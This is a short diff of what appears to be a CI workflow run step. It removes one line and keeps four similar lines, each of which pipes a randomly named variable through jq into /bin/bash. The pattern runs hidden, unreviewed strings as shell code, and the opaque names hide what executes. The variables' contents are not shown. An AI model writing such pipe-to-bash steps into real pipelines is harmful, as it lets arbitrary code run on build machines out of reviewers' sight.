@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$vndl05" | jq -r .jmfy71316 | /bin/bash
           printf '%s' "$iiltp9424" | jq -r .vsgzl32 | /bin/bash
-          printf '%s' "$sil16684" | jq -r .gwaru14870 | /bin/bash
           echo $t79170 | jq -r .oyiv95 | /bin/bash
           printf '%s' "$qxxrx21718" | jq -r .y21977 | /bin/bash
 
